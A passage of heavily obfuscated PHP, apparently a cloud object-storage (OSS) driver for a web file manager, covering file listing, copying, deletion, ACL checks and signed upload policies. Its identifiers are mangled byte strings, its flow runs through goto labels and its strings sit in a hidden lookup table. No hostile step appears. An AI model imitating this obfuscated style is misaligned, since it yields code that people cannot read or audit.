$BŠ–±áùâ[$Bï¹„‹Ü—ğ[193]]); if (!is_array($E¾³„·Šã¼)) { $E¾³„·Šã¼ = array(); } goto E‰¥Óê´í; E‰¥Óê´í: $Cô—ßŠ›Š = array($Bï¹„‹Ü—ğ[194], $Bï¹„‹Ü—ğ[195], $Bï¹„‹Ü—ğ[196], $Bï¹„‹Ü—ğ[197], $Bï¹„‹Ü—ğ[198]); $Fë‡°Øâù‘ = array_diff($Cô—ßŠ›Š, $E¾³„·Šã¼); return empty($Fë‡°Øâù‘); goto E†èÄ¤Ú¦Ù; fÅÚğÎ®²: $Bï¹„‹Ü—ğ =& $_SERVER[±á õÁ]; $BŠ–±áùâ = $this->getBucketCors(); if (!$BŠ–±áùâ || !is_array($BŠ–±áùâ)) { return !1; } goto c•‘•åù˜¹; E†èÄ¤Ú¦Ù: } public function mkfile($C”ğ‹¢„ˆß, $cĞíƒôŠ©é = '', $C’¶ĞÑ¾ = REPEAT_RENAME) { $bŞªÏæôáÑ = $this->setContent($C”ğ‹¢„ˆß, $cĞíƒôŠ©é); if ($bŞªÏæôáÑ !== !1) { return $this->getPathOuter($C”ğ‹¢„ˆß); } return !1; } public function mkdir($d¡Ë‹‘Ğò, $c‘º’ŸƒÙî = REPEAT_SKIP) { if ($this->_isFolder($d¡Ë‹‘Ğò)) { return $this->getPathOuter($d¡Ë‹‘Ğò); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($d¡Ë‹‘Ğò)); } catch (OSS\Core\OssException $aĞÖ¤ßßõË) { return !1; } return $this->getPathOuter($d¡Ë‹‘Ğò); } private function fileList($F™òİØ´é, $aöëˆ‡Ä¸É = '', $CÆº×–Àö© = 0) { goto a¤È¬³–Ï; B‰äœáÔÀÌ: return array($a¯Ğ×¸Ó´Ù[84] => $bÓÉ×ãÕ±æ, $a¯Ğ×¸Ó´Ù[83] => $B¿å«˜•åñ); goto e¥Øñ»†¡ï; a¤È¬³–Ï: $a¯Ğ×¸Ó´Ù =& $_SERVER[±á õÁ]; $F™òİØ´é = trim($F™òİØ´é, $a¯Ğ×¸Ó´Ù[8]); $aÒØ–²”ö = empty($F™òİØ´é) ? $a¯Ğ×¸Ó´Ù[43] : $F™òİØ´é . $a¯Ğ×¸Ó´Ù[8]; goto b‰©ÍÜìÛ­; b‰©ÍÜìÛ­: $CÈ‡Ä¬ëù = $a¯Ğ×¸Ó´Ù[43]; $f±ö‰±æç‘ = 1000; $d¯è•‚èª = $this->listItemCache === !1 ? !1 : !0; goto BåŞˆèİË»; BåŞˆèİË»: $bÓÉ×ãÕ±æ = $B¿å«˜•åñ = array(); while (!0) { check_abort(); $d˜ÆğÔß—‚ = array($a¯Ğ×¸Ó´Ù[1202] => $aöëˆ‡Ä¸É, $a¯Ğ×¸Ó´Ù[1203] => $aÒØ–²”ö, $a¯Ğ×¸Ó´Ù[1204] => $f±ö‰±æç‘, $a¯Ğ×¸Ó´Ù[1205] => $CÈ‡Ä¬ëù); try { $d‚òõÉæ‹ = $this->client->listObjects($this->bucket, $d˜ÆğÔß—‚); } catch (OSS\Core\OssException $aÃŠ³ÂÀã¹) { break; } $CÈ‡Ä¬ëù = $d‚òõÉæ‹->getNextMarker(); $AºƒÓˆœ¿· = $d‚òõÉæ‹->getObjectList(); $dµÈ„œ½–® = $d‚òõÉæ‹->getPrefixList(); foreach ($AºƒÓˆœ¿· as $a¸ˆ»óæÛ) { goto EÉ‰¨ÏÕÒŠ; EÉ‰¨ÏÕÒŠ: if ($a¸ˆ»óæÛ->getKey() == $aÒØ–²”ö) { continue; } $a”§ÕÊçéÏ = $a¸ˆ»óæÛ->getKey(); $aÔ°ß—«™ù = $a¸ˆ»óæÛ->getSize(); goto d·ÎÕ‡•ùÒ; d·ÎÕ‡•ùÒ: $bÃ¢ì²˜ = $a¸ˆ»óæÛ->getLastModified(); $dˆË‚‹Û®Ï = $CÆº×–Àö© ? array($a¯Ğ×¸Ó´Ù[38] => $a”§ÕÊçéÏ, $a¯Ğ×¸Ó´Ù[87] => $aÔ°ß—«™ù, $a¯Ğ×¸Ó´Ù[203] => strtotime($bÃ¢ì²˜)) : $a”§ÕÊçéÏ; $aÜ’‹ğ‰ = $aÔ°ß—«™ù == 0 && substr($a”§ÕÊçéÏ, strlen($a”§ÕÊçéÏ) - 1, 1) == $a¯Ğ×¸Ó´Ù[8] ? !0 : !1; goto CĞŸŠµŒà…; CĞŸŠµŒà…: if ($d¯è•‚èª) { $this->cacheMethod($a¯Ğ×¸Ó´Ù[205], $a”§ÕÊçéÏ, $aÜ’‹ğ‰); $this->cacheMethod($a¯Ğ×¸Ó´Ù[206], $a”§ÕÊçéÏ, array($a¯Ğ×¸Ó´Ù[87] => $aÔ°ß—«™ù, $a¯Ğ×¸Ó´Ù[1206] => $aÔ°ß—«™ù, $a¯Ğ×¸Ó´Ù[117] => strtotime($bÃ¢ì²˜), $a¯Ğ×¸Ó´Ù[1207] => $bÃ¢ì²˜)); } if ($aÜ’‹ğ‰) { $bÓÉ×ãÕ±æ[] = $a”§ÕÊçéÏ; continue; } $B¿å«˜•åñ[] = $dˆË‚‹Û®Ï; goto E¤Œº‰µå; E¤Œº‰µå: } foreach ($dµÈ„œ½–® as $DÓÜ¥èŒ»¬) { $bÓÉ×ãÕ±æ[] = $DÓÜ¥èŒ»¬->getPrefix(); if ($d¯è•‚èª) { $this->cacheMethod($a¯Ğ×¸Ó´Ù[205], $a”§ÕÊçéÏ, !0); } } if ($CÈ‡Ä¬ëù === $a¯Ğ×¸Ó´Ù[43]) { break; } } if ($d¯è•‚èª) { $this->cacheMethod($a¯Ğ×¸Ó´Ù[205], $F™òİØ´é, !0); } goto B‰äœáÔÀÌ; e¥Øñ»†¡ï: } public function copyFile($dË¯ğöêĞ‚, $D‘Óàäóë) { $A§°£–óŠ = $this->size($dË¯ğöêĞ‚); if ($A§°£–óŠ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $dË¯ğöêĞ‚, $this->bucket, $this->pathEncode($D‘Óàäóë)); } catch (OSS\Core\OssException $EÇÌ´”ˆÉ) { return !1; } return $this->getPathOuter($D‘Óàäóë); } $aß’˜Î‘»Œ = $this->multiCopyObject($dË¯ğöêĞ‚, $D‘Óàäóë, $A§°£–óŠ); return $aß’˜Î‘»Œ ? $this->getPathOuter($D‘Óàäóë) : !1; } private function multiCopyObject($aºŒî”¾ÃØ, $fÆ•¹Ğ´›ñ, $F´éåçˆèã) { $fîÉÚ‚Š¯Í =& $_SERVER[±á õÁ]; try { goto A¡ÖÖïÈÑ; A¡ÖÖïÈÑ: $Dœ¦ñ‡İ = array(); if ($f‚Íà‘ºò = $this->hashMd5($aºŒî”¾ÃØ)) { $Dœ¦ñ‡İ = array(OSS\OssClient::OSS_HEADERS => array($fîÉÚ‚Š¯Í[1208] => $f‚Íà‘ºò)); } $B’çˆà´ñ¼ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fÆ•¹Ğ´›ñ), $Dœ¦ñ‡İ); goto A·Û‘ù¦™É; A·Û‘ù¦™É: $Dâºê¢ò§« = 1; $c‹§Ú°Ø„‹ = 0; $fò¹Ö½…‚é = array(); goto c‚æØÜï¹È; c‚æØÜï¹È: $F‘ë‹òí®È = 1024 * 1024 * 10; $E¿½Åù‡¢¡ = $this->client->generateMultiuploadParts($F´éåçˆèã, $F‘ë‹òí®È); foreach ($E¿½Åù‡¢¡ as $eÎíÚ¾íà => $DŒ·ÆäÍ‡…) { $fİáë¯£Ñ¸ = $c‹§Ú°Ø„‹ + (int) $DŒ·ÆäÍ‡…[$fîÉÚ‚Š¯Í[1209]]; $böÁ¦Ó‚„– = (int) $DŒ·ÆäÍ‡…[$fîÉÚ‚Š¯Í[340]] + $fİáë¯£Ñ¸ - 1; $fƒ¼ƒ±§Ù = array($fîÉÚ‚Š¯Í[1210] => $fİáë¯£Ñ¸, $fîÉÚ‚Š¯Í[1211] => $böÁ¦Ó‚„–); $fò¹Ö½…‚é[] = $this->client->uploadPartCopy($this->bucket, $aºŒî”¾ÃØ, $this->bucket, $this->pathEncode($fÆ•¹Ğ´›ñ), $Dâºê¢ò§«, $B’çˆà´ñ¼, $fƒ¼ƒ±§Ù); $Dâºê¢ò§« = $Dâºê¢ò§« + 1; } goto C·ĞÎĞŠ†‰; C·ĞÎĞŠ†‰: $a‰Ç§«”‡Ô = array(); foreach ($fò¹Ö½…‚é as $eÎíÚ¾íà => $e¡××Ø„À™) { $a‰Ç§«”‡Ô[] = array($fîÉÚ‚Š¯Í[1212] => $eÎíÚ¾íà + 1, $fîÉÚ‚Š¯Í[1213] => $e¡××Ø„À™); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($fÆ•¹Ğ´›ñ), $B’çˆà´ñ¼, $a‰Ç§«”‡Ô); goto C’ŞÖ¶õÊ¢; C’ŞÖ¶õÊ¢: } catch (OSS\Core\OssException $d±ÜÇÑ‹Úã) { return !1; } return !0; } public function moveFile($Dƒªø¿¡—, $F…Ò÷¡ÁÜ) { if ($this->copyFile($Dƒªø¿¡—, $F…Ò÷¡ÁÜ)) { $this->remove($Dƒªø¿¡—); return $this->getPathOuter($F…Ò÷¡ÁÜ); } return !1; } public function delFile($dùá„âÃÓ¾) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dùá„âÃÓ¾)); } catch (OSS\Core\OssException $fÄš³ƒ¨’) { return !1; } return !0; } public function delFolder($f¤  ³¡¸) { goto b§ñÛõ¿·ç; F‰Êšé§¯“: if (!empty($f¤  ³¡¸) && !in_array($cğÌ£ñåÇ, $FùêİÛ½Éõ[$c‹ÆÆíä•´[84]])) { $FùêİÛ½Éõ[$c‹ÆÆíä•´[84]][] = $cğÌ£ñåÇ; } $d­–“ÕÒÏ = $this->delByBatch($FùêİÛ½Éõ[$c‹ÆÆíä•´[83]]); if (!$d­–“ÕÒÏ) { return !1; } goto A¶¦—„ÑÅ; A¶¦—„ÑÅ: return $this->delByBatch($FùêİÛ½Éõ[$c‹ÆÆíä•´[84]]); goto e„ƒÚÃÄ; bô¥ùŒî¼ï: $FùêİÛ½Éõ = $this->fileList($f¤  ³¡¸); $this->listItemCache = !0; $cğÌ£ñåÇ = trim($f¤  ³¡¸, $c‹ÆÆíä•´[8]) . $c‹ÆÆíä•´[8]; goto F‰Êšé§¯“; b§ñÛõ¿·ç: $c‹ÆÆíä•´ =& $_SERVER[±á õÁ]; if (!$this->exist($f¤  ³¡¸)) { return !0; } $this->listItemCache = !1; goto bô¥ùŒî¼ï; e„ƒÚÃÄ: } private function delByBatch($aœÌ˜•Ÿ ÷) { foreach (array_chunk($aœÌ˜•Ÿ ÷, 1000) as $b´„¹¶°ÇÜ) { try { $this->client->deleteObjects($this->bucket, $b´„¹¶°ÇÜ); } catch (OSS\Core\OssException $A²àŒ©ª“å) { return !1; } } return !0; } public function rename($eâù­­ùÂ, $A¬„Á£Ş¸É) { return $this->renameObject($eâù­­ùÂ, $A¬„Á£Ş¸É); } private function fileInfo($F«ƒ°«“°, $eôŠÄ‰Õ»› = false, $Bä›Ó¸™¿ = array()) { goto CœÇ‚†ö“; e«Àé§Õ: return $AÂ»ÓàóšŸ; goto BÎ’é†¬İó; b‘Œ¨›•®ö: if (isset($Bä›Ó¸™¿[$FåÖŞê·‘[87]])) { $AÂ»ÓàóšŸ[$FåÖŞê·‘[87]] = $Bä›Ó¸™¿[$FåÖŞê·‘[87]]; } if (isset($Bä›Ó¸™¿[$FåÖŞê·‘[117]])) { $AÂ»ÓàóšŸ[$FåÖŞê·‘[117]] = $Bä›Ó¸™¿[$FåÖŞê·‘[117]]; } if (isset($Bä›Ó¸™¿[$FåÖŞê·‘[203]]) && !trim($AÂ»ÓàóšŸ[$FåÖŞê·‘[117]])) { $AÂ»ÓàóšŸ[$FåÖŞê·‘[117]] = $Bä›Ó¸™¿[$FåÖŞê·‘[203]]; } goto e«Àé§Õ; dğÊ®ìãŒ: $AÂ»ÓàóšŸ[$FåÖŞê·‘[200]] = $AÂ»ÓàóšŸ[$FåÖŞê·‘[117]] = 0; $AÂ»ÓàóšŸ[$FåÖŞê·‘[201]] = $AÂ»ÓàóšŸ[$FåÖŞê·‘[202]] = !0; if (empty($Bä›Ó¸™¿)) { $AçÒø¤à = $this->objectMeta($F«ƒ°«“°); if (!$AçÒø¤à) { return $AÂ»ÓàóšŸ; } $Bä›Ó¸™¿ = array($FåÖŞê·‘[117] => strtotime($AçÒø¤à[$FåÖŞê·‘[1207]]), $FåÖŞê·‘[87] => $AçÒø¤à[$FåÖŞê·‘[1206]] + 0); } goto b‘Œ¨›•®ö; CœÇ‚†ö“: $FåÖŞê·‘ =& $_SERVER[±á õÁ]; $AÂ»ÓàóšŸ = array($FåÖŞê·‘[38] => $this->pathThis($F«ƒ°«“°), $FåÖŞê·‘[85] => $this->getPathOuter($F«ƒ°«“°), $FåÖŞê·‘[39] => $FåÖŞê·‘[181], $FåÖŞê·‘[87] => isset($Bä›Ó¸™¿[$FåÖŞê·‘[87]]) ? $Bä›Ó¸™¿[$FåÖŞê·‘[87]] : 0, $FåÖŞê·‘[175] => $this->ext($F«ƒ°«“°)); if ($eôŠÄ‰Õ»›) { return $AÂ»ÓàóšŸ; } goto dğÊ®ìãŒ; BÎ’é†¬İó: } private function folderInfo($Eº‹¶Ëä , $E‹¯±çŠ†µ = false, $AùÌ®Ğ¥í = array()) { goto FëŠÌ¥êÄ¸; FëŠÌ¥êÄ¸: $Eæ”“†¹™Î =& $_SERVER[±á õÁ]; $EÎ¹—ƒÀ»° = array($Eæ”“†¹™Î[38] => $this->pathThis($Eº‹¶Ëä ), $Eæ”“†¹™Î[85] => $this->getPathOuter($Eæ”“†¹™Î[8] . $Eº‹¶Ëä ), $Eæ”“†¹™Î[39] => $Eæ”“†¹™Î[86]); if ($E‹¯±çŠ†µ) { return $EÎ¹—ƒÀ»°; } goto eˆáçĞ³•; d¡“­ÆëÑ: if (isset($AùÌ®Ğ¥í[$Eæ”“†¹™Î[117]])) { $EÎ¹—ƒÀ»°[$Eæ”“†¹™Î[117]] = $AùÌ®Ğ¥í[$Eæ”“†¹™Î[117]]; } if (isset($AùÌ®Ğ¥í[$Eæ”“†¹™Î[200]])) { $EÎ¹—ƒÀ»°[$Eæ”“†¹™Î[200]] = $AùÌ®Ğ¥í[$Eæ”“†¹™Î[200]]; } return $EÎ¹—ƒÀ»°; goto B¸İƒÎîÈò; eˆáçĞ³•: $EÎ¹—ƒÀ»°[$Eæ”“†¹™Î[200]] = $EÎ¹—ƒÀ»°[$Eæ”“†¹™Î[117]] = 0; $EÎ¹—ƒÀ»°[$Eæ”“†¹™Î[201]] = $EÎ¹—ƒÀ»°[$Eæ”“†¹™Î[202]] = !0; if (empty($AùÌ®Ğ¥í)) { $Eº‹¶Ëä  = rtrim($Eº‹¶Ëä , $Eæ”“†¹™Î[8]) . $Eæ”“†¹™Î[8]; $CØŒŠäÊÄ = $this->objectMeta($Eº‹¶Ëä ); if (!$CØŒŠäÊÄ) { return $EÎ¹—ƒÀ»°; } $AùÌ®Ğ¥í = array($Eæ”“†¹™Î[200] => $CØŒŠäÊÄ[$Eæ”“†¹™Î[1214]][$Eæ”“†¹™Î[1215]], $Eæ”“†¹™Î[117] => strtotime($CØŒŠäÊÄ[$Eæ”“†¹™Î[1207]])); } goto d¡“­ÆëÑ; B¸İƒÎîÈò: } public function listPath($EíØª¥ËÑÚ, $bÀö’Ãß˜Ò = false) { $Fà¥¡¡šÉ­ =& $_SERVER[±á õÁ]; $AŠùùÏ­ = $this->fileList($EíØª¥ËÑÚ, $Fà¥¡¡šÉ­[8], !0); foreach ($AŠùùÏ­[$Fà¥¡¡šÉ­[84]] as $D¿Ş¥›©×¢ => $Bî¯ëß˜â) { $AŠùùÏ­[$Fà¥¡¡šÉ­[84]][$D¿Ş¥›©×¢] = $this->folderInfo($Bî¯ëß˜â, $bÀö’Ãß˜Ò, $Bî¯ëß˜â); } foreach ($AŠùùÏ­[$Fà¥¡¡šÉ­[83]] as $D¿Ş¥›©×¢ => $Bî¯ëß˜â) { $AŠùùÏ­[$Fà¥¡¡šÉ­[83]][$D¿Ş¥›©×¢] = $this->fileInfo($Bî¯ëß˜â[$Fà¥¡¡šÉ­[38]], $bÀö’Ãß˜Ò, $Bî¯ëß˜â); } return $AŠùùÏ­; } public function has($Dˆï‡ÈçĞÃ, $EæùÍÚÏô— = false, $CØçÕ«êê± = true) { goto FÒˆŠÕÑêˆ; DÑñ÷¬ÖÒ: $f†­…˜ÁŠ„ = $bî ®ÃãÜ½[43]; $AÅ®÷­½šš = 500; $DïŠ™èï†© = $dôÆäĞ…¡Ğ = 0; goto câ¬³²‰„; FÒˆŠÕÑêˆ: $bî ®ÃãÜ½ =& $_SERVER[±á õÁ]; $Dˆï‡ÈçĞÃ = trim($Dˆï‡ÈçĞÃ, $bî ®ÃãÜ½[8]); $BÌ’ªç«Œà = empty($Dˆï‡ÈçĞÃ) ? $bî ®ÃãÜ½[43] : $Dˆï‡ÈçĞÃ . $bî ®ÃãÜ½[8]; goto DÑñ÷¬ÖÒ; câ¬³²‰„: while (!0) { check_abort(); $CÏÉ’‚‡Ãß = array($bî ®ÃãÜ½[1202] => $bî ®ÃãÜ½[8], $bî ®ÃãÜ½[1203] => $BÌ’ªç«Œà, $bî ®ÃãÜ½[1204] => $AÅ®÷­½šš, $bî ®ÃãÜ½[1205] => $f†­…˜ÁŠ„); try { $E‘¶ÍÀ‹ù = $this->client->listObjects($this->bucket, $CÏÉ’‚‡Ãß); } catch (OSS\Core\OssException $AäÍ¶ÖÁæ) { break; } $f†­…˜ÁŠ„ = $E‘¶ÍÀ‹ù->getNextMarker(); $CÙº¼ŒÄåØ = $E‘¶ÍÀ‹ù->getObjectList(); $BÚ–Ôù¤§ = $E‘¶ÍÀ‹ù->getPrefixList(); if ($EæùÍÚÏô—) { if (count($CÙº¼ŒÄåØ) > 1 || count($CÙº¼ŒÄåØ) == 1 && $CÙº¼ŒÄåØ[0]->getKey() != $BÌ’ªç«Œà) { $DïŠ™èï†© += count($CÙº¼ŒÄåØ) - 1; } if (!empty($BÚ–Ôù¤§)) { $dôÆäĞ…¡Ğ += count($BÚ–Ôù¤§); } if ($f†­…˜ÁŠ„ === $bî ®ÃãÜ½[43]) { break; } continue; } if ($CØçÕ«êê±) { if (!empty($CÙº¼ŒÄåØ)) { if (count($CÙº¼ŒÄåØ) > 1 || $CÙº¼ŒÄåØ[0]->getKey() != $BÌ’ªç«Œà) { return !0; } } } else { if (!empty($BÚ–Ôù¤§)) { return !0; } } if ($f†­…˜ÁŠ„ === $bî ®ÃãÜ½[43]) { break; } } if ($EæùÍÚÏô—) { return array($bî ®ÃãÜ½[209] => $DïŠ™èï†©, $bî ®ÃãÜ½[210] => $dôÆäĞ…¡Ğ); } return !1; goto cé¾·¬Ì˜‚; cé¾·¬Ì˜‚: } public function listAll($C®ÅƒëÄêĞ) { $eé¦µ§Õ‚á =& $_SERVER[±á õÁ]; $EÁ¸Ÿ×Äó× = $this->fileList($C®ÅƒëÄêĞ, $eé¦µ§Õ‚á[43], !0); $c×œ¹ñÄ»½ = array(); foreach ($EÁ¸Ÿ×Äó×[$eé¦µ§Õ‚á[83]] as $d¡¡¯”—ŞŒ) { $c×œ¹ñÄ»½[$d¡¡¯”—ŞŒ[$eé¦µ§Õ‚á[38]]] = $d¡¡¯”—ŞŒ[$eé¦µ§Õ‚á[87]]; } foreach ($EÁ¸Ÿ×Äó×[$eé¦µ§Õ‚á[84]] as $d¡¡¯”—ŞŒ) { if (is_string($d¡¡¯”—ŞŒ)) { $c×œ¹ñÄ»½[$d¡¡¯”—ŞŒ] = 0; } } return $this->listAllFiles($C®ÅƒëÄêĞ, array_keys($c×œ¹ñÄ»½), $c×œ¹ñÄ»½); } public function canRead($d¤ˆØòˆŞĞ) { $d–óâ¾ëñ¯ =& $_SERVER[±á õÁ]; $B‘¢½¥Ï›Î = $this->pathAcl($d¤ˆØòˆŞĞ); return $B‘¢½¥Ï›Î == $d–óâ¾ëñ¯[1216] || $B‘¢½¥Ï›Î == $d–óâ¾ëñ¯[516] ? !0 : !1; } public function canWrite($eŞ›ªôê¨±) { $a¥Ş×É‹¸· = $this->pathAcl($eŞ›ªôê¨±); return $a¥Ş×É‹¸· == $_SERVER[±á õÁ][516] ? !0 : !1; } public function pathAcl($FËåÇ¿ôË) { goto E÷—§µºä; E÷—§µºä: $e›ğÈ±¼§™ =& $_SERVER[±á õÁ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $BæîÊ¼ÙÂ¢ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($FËåÇ¿ôË)); } catch (OSS\Core\OssException $f™ÍÈïºËÛ) { return !1; } goto D…¹ˆŒˆÕ; D…¹ˆŒˆÕ: $a®øÑ­î‹º = $BæîÊ¼ÙÂ¢ == $e›ğÈ±¼§™[44] ? $this->bucketAcl : $BæîÊ¼ÙÂ¢; if ($a®øÑ­î‹º == $e›ğÈ±¼§™[1217]) { return $e›ğÈ±¼§™[1216]; } if ($a®øÑ­î‹º == $e›ğÈ±¼§™[1218]) { return $e›ğÈ±¼§™[516]; } goto b‰™ğîå¢; b‰™ğîå¢: return $a®øÑ­î‹º; goto CŒŠ‚¨ª²Š; CŒŠ‚¨ª²Š: } private function chmodPath($fœÏ¼¨°Ö¬, $dÚ©òÏ¸ò = '') { $FÛš›ÉäÆ =& $_SERVER[±á õÁ]; $c…‘Å‡ùé‘ = empty($dÚ©òÏ¸ò) ? $FÛš›ÉäÆ[1218] : $dÚ©òÏ¸ò; $cÆæÏÎ­è = array($FÛš›ÉäÆ[44], $FÛš›ÉäÆ[199], $FÛš›ÉäÆ[1217], $FÛš›ÉäÆ[1218]); if (!in_array($c…‘Å‡ùé‘, $cÆæÏÎ­è)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($fœÏ¼¨°Ö¬), $c…‘Å‡ùé‘); } catch (OSS\Core\OssException $Eºó‰¢ÅÖæ) { return !1; } return !0; } public function getContent($f¾ºƒ†¼†«) { return $this->fileSubstr($f¾ºƒ†¼†«, -1); } public function setContent($A¨ÎË…½ƒ½, $cÓÓ”Œœ’Æ = '') { $E®ì”÷‰Ø‚ =& $_SERVER[±á õÁ]; try { $EÓ™¿¼ˆ¼ = $this->trafficLimit($E®ì”÷‰Ø‚[1219]); $BÒµÃã §ä = $this->client->putObject($this->bucket, $this->pathEncode($A¨ÎË…½ƒ½), $cÓÓ”Œœ’Æ, $EÓ™¿¼ˆ¼); } catch (OSS\Core\OssException $D÷âÖ…Ñ˜¹) { return !1; } $BÖ‰Š¬´Šñ = array($E®ì”÷‰Ø‚[1208] => trim($BÒµÃã §ä[$E®ì”÷‰Ø‚[1220]], $E®ì”÷‰Ø‚[123]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A¨ÎË…½ƒ½))); $this->updateObjMeta($A¨ÎË…½ƒ½, $BÖ‰Š¬´Šñ); return isset($BÒµÃã §ä[$E®ì”÷‰Ø‚[1221]][$E®ì”÷‰Ø‚[1167]]) ? (int) $BÒµÃã §ä[$E®ì”÷‰Ø‚[1221]][$E®ì”÷‰Ø‚[1167]] : strlen($BÒµÃã §ä); } private function updateObjMeta($d¶©œÔ·ï, $BÃÁ¹¼ˆğ¼) { $d¶©œÔ·ï = $this->pathEncode($d¶©œÔ·ï); try { $eãÇÇÚ´±Ê = array(OSS\OssClient::OSS_HEADERS => $BÃÁ¹¼ˆğ¼); $this->client->copyObject($this->bucket, $d¶©œÔ·ï, $this->bucket, $d¶©œÔ·ï, $eãÇÇÚ´±Ê); } catch (OSS\Core\OssException $c‘Í´‡ÂÈ¶) { return !1; } return !0; } public function upload($CğİêĞšÖÕ, $cí‡à™Şù‰, $C¥íáó‹™¡ = false, $fµÇŒ˜ã“Å = REPEAT_REPLACE) { $f¸ªèâì¹æ =& $_SERVER[±á õÁ]; $F©÷•°Í•ß = trim($CğİêĞšÖÕ, $f¸ªèâì¹æ[8]); $C±˜¬Øˆ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($f¸ªèâì¹æ[1208] => @md5_file($cí‡à™Şù‰)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CğİêĞšÖÕ))); $C±˜¬Øˆ = $this->trafficLimit($f¸ªèâì¹æ[1219], $C±˜¬Øˆ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($F©÷•°Í•ß), $cí‡à™Şù‰, $C±˜¬Øˆ); } catch (OSS\Core\OssException $Eõ¿¬áêÎŸ) { return !1; } return $this->getPathOuter($CğİêĞšÖÕ); } public function getHost() { $A‰…Î¶Ë’¨ =& $_SERVER[±á õÁ]; $Aïè—Ñ°¬¢ = explode($A‰…Î¶Ë’¨[185], parent::getHost()); return $Aïè—Ñ°¬¢[0] . $A‰…Î¶Ë’¨[185] . $this->bucket . $A‰…Î¶Ë’¨[101] . $Aïè—Ñ°¬¢[1]; } public function uploadFormData($bÌ›Ç³—ì, $D¥’å¨Á¿Ë = 3600) { goto bƒô»²õòç; b„ùÔ°Á: $f•Ç¸‹Æ = base64_encode(hash_hmac($E°‚Æ„ƒÀÈ[235], $dßÔïº¸–, $this->secret, !0)); $fåä£ùáÍ» = array($E°‚Æ„ƒÀÈ[1133] => $dßÔïº¸–, $E°‚Æ„ƒÀÈ[1225] => $this->accessKey, $E°‚Æ„ƒÀÈ[1129] => $E°‚Æ„ƒÀÈ[1121], $E°‚Æ„ƒÀÈ[1226] => $f•Ç¸‹Æ, $E°‚Æ„ƒÀÈ[183] => $bÙ„©Ö „¬); $fåä£ùáÍ» = $this->trafficLimit($E°‚Æ„ƒÀÈ[1219], $fåä£ùáÍ»); goto DĞŒŒáÚñ˜; Cèƒ»ø‘ ì: $EîÎïñ½ê» = strpos($DÒ´®¨šåÚ, $E°‚Æ„ƒÀÈ[299]); $DÒ´®¨šåÚ = substr($DÒ´®¨šåÚ, 0, $EîÎïñ½ê») . $E°‚Æ„ƒÀÈ[1223]; $bù””ß§Ò = 1048576000 * 5; goto f¸Üõ¶öˆ; bƒô»²õòç: $E°‚Æ„ƒÀÈ =& $_SERVER[±á õÁ]; if (!($bÙ„©Ö „¬ = $this->getHost())) { return !1; } $bŒ› •§Í— = $D¥’å¨Á¿Ë; goto A‚†º‹É¬; DĞŒŒáÚñ˜: return $fåä£ùáÍ»; goto e‹ïË¯Ê»; f¸Üõ¶öˆ: $f‹¶ÔÈ•Ç® = $this->pathFather($bÌ›Ç³—ì); $a ‹§¢–¼ß = array($E°‚Æ„ƒÀÈ[1123] => $DÒ´®¨šåÚ, $E°‚Æ„ƒÀÈ[1124] => array(array($E°‚Æ„ƒÀÈ[1224], 0, $bù””ß§Ò), array($E°‚Æ„ƒÀÈ[1127], $E°‚Æ„ƒÀÈ[1128], $f‹¶ÔÈ•Ç®))); $dßÔïº¸– = base64_encode(json_encode($a ‹§¢–¼ß)); goto b„ùÔ°Á; A‚†º‹É¬: $EÆ¸Â¨Øã = date($E°‚Æ„ƒÀÈ[1222], time() + $bŒ› •§Í—); $d¬ßŒâ—©… = new DateTime($EÆ¸Â¨Øã); $DÒ´®¨šåÚ = $d¬ßŒâ—©…->format(DateTime::ISO8601); goto Cèƒ»ø‘ ì; e‹ïË¯Ê»: } public function multiUploadFormData($B©šƒ¼Õ‘—, $dÍø”‡©¦¶ = 3600) { $dÊõŒªÆ†Ä =& $_SERVER[±á õÁ]; if (!($F¦˜ßõğœÍ = $this->getHost())) { return !1; } $D¥¬ª•”… = $this->trafficLimit($dÊõŒªÆ†Ä[1219]); $eó«ƒÊ¡èÎ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B©šƒ¼Õ‘—), $D¥¬ª•”…); return array($dÊõŒªÆ†Ä[227] => $eó«ƒÊ¡èÎ, $dÊõŒªÆ†Ä[183] => $F¦˜ßõğœÍ . $dÊõŒªÆ†Ä[8] . $this->pathEncode($B©šƒ¼Õ‘—), $dÊõŒªÆ†Ä[228] => gmdate($dÊõŒªÆ†Ä[1227]), $dÊõŒªÆ†Ä[99] => $B©šƒ¼Õ‘—); } public function multiUploadAuthData($e¸“®ƒšâŠ, $FóíÀæ¢° = array()) { goto d×šÖÉª‘; Bòôå¥«ğÂ: $aÕ™´Î®íá = $BÖñµÌ©”¿[1192] . $this->accessKey . $BÖñµÌ©”¿[4] . $C«ª±¥ùÃï; if (strpos($FÖ­î•Ä•Ù, $BÖñµÌ©”¿[231]) === 0) { $aÕ™´Î®íá = array($BÖñµÌ©”¿[237] => $aÕ™´Î®íá, $BÖñµÌ©”¿[228] => $C•Ï”ÅéÈ©); if ($aÕÙ‹áó¸Ì) { $aÕ™´Î®íá = array_merge($aÕ™´Î®íá, $aÕÙ‹áó¸Ì); } } return $aÕ™´Î®íá; goto DÙ‹ğ½£°Ó; D¦Ğ¸¡ÂÊÇ: $A«¹Ö—Ô½ = $e¸“®ƒšâŠ; if (isset($FóíÀæ¢°[$BÖñµÌ©”¿[99]])) { $A«¹Ö—Ô½ = $FóíÀæ¢°[$BÖñµÌ©”¿[99]]; unset($FóíÀæ¢°[$BÖñµÌ©”¿[99]]); } if (isset($FóíÀæ¢°[$BÖñµÌ©”¿[229]])) { $FóíÀæ¢°[$BÖñµÌ©”¿[228]] = $C•Ï”ÅéÈ©; return $this->listUploadParts($A«¹Ö—Ô½, $FóíÀæ¢°); } goto FƒÅ†Œô¶ë; FƒÅ†Œô¶ë: $dÆÔ¦ö¾’ = array($BÖñµÌ©”¿[230], 